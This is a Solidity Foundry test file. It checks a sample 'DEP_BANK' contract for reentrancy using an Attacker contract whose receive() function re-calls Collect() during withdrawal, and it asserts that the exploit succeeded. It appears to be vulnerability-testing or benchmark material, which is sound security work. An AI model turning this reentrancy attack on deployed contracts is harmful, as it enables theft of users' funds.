
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";
import {DEP_BANK} from "../src/DEP_BANK.sol";

contract TestReentrancyDEP_BANK is Test {
    using stdStorage for StdStorage;

    DEP_BANK public _contractUnderTest;
    LogFile public _log;
    
    Attacker public _attacker;

    function setUp() public {
        _log = new LogFile();
        _contractUnderTest = new DEP_BANK();
        
        _contractUnderTest.SetMinSum(0);
        _contractUnderTest.SetLogFile(address(_log));
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal < type(uint128).max / 2);
        vm.assume(attackVal < 1 ether);

        uint256 victimInitialBalance = attackVal * 2;
        vm.deal(address(_contractUnderTest), victimInitialBalance);
        
        uint256 attackerInitialBalance = attackVal * 2;
        vm.deal(address(_attacker), attackerInitialBalance);
        
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    DEP_BANK public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = DEP_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        _victim.Deposit{value: val * 2}();
        
        storedAttackVal = val;
        initialSnapshot = address(this).balance;
    }

    function attack(uint256 val) public {
        _victim.Collect(storedAttackVal);
        
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        
        if (attackCallCount < 2) {
            _victim.Collect(storedAttackVal);
        }
    }
}

contract LogFile
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    
    Message[] public History;
    
    Message LastMsg;
    
    function AddMessage(address _adr,uint _val,string memory _data) public {
        LastMsg.Sender = _adr;
        LastMsg.Time = block.timestamp;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}
